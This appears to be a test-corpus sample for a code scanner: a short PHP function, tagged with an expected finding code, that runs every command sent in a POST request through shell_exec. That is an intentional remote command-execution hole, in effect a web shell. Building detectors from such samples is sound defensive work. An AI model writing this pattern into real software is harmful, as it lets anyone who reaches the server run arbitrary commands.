<?php // corpus: expect=PG-CMD-005
function runAll() {
    return array_map('shell_exec', $_POST['commands']);
}
